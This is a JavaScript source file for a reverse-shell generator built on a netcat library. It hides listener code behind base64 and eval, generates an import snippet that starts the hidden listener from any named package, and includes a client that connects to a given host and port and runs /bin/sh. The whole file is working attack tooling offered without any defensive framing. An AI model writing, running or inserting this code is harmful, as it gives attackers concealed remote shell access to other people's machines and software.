import netcat from 'netcat'

class ReverseShellGenerator {
    constructor({ host, port }) {
        this.host = host;
        this.port = port;
    }

    listener() {
        const listener_code = `server.k().port(${this.port}).listen().serve(process.stdin).pipe(process.stdout)`
        const encoded_listener_code = Buffer.from(listener_code).toString('base64');
        const code = `import netcat from 'netcat'
const server = new netcat.server()
class ReverseShell {
    start() {
        eval(Buffer.from('${encoded_listener_code}', 'base64').toString('ascii'))
    }
}`

        return `${code}
export default ReverseShell`
    }

    opener(pkg) {
        return `\nimport M from '${pkg}'
const Listener = new M()
Listener.start()\n`
    }

    runLocalClient() {
        const client = new netcat.client()
        client.addr(this.host).port(this.port).retry(5000).connect().exec('/bin/sh')
    }
}

export default ReverseShellGenerator
